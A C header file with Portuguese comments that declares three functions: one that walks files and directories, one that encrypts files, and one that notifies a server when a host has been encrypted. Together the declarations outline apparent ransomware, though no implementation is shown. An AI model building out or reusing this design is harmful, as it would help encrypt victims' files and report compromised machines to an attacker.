#ifndef USAGE_H_INCLUDED
#define USAGE_H_INCLUDED

struct dirent *getdir;
//Funçao que avisa o servidor que algum host foi criptografado
void connectserver();
//Funçao que faz a criptografia de arquivos
void encryptfile(char *encryptfile);
//Funçao que procura arquivos & diretorios
void WhatIsDir(char *name_dir);

#endif
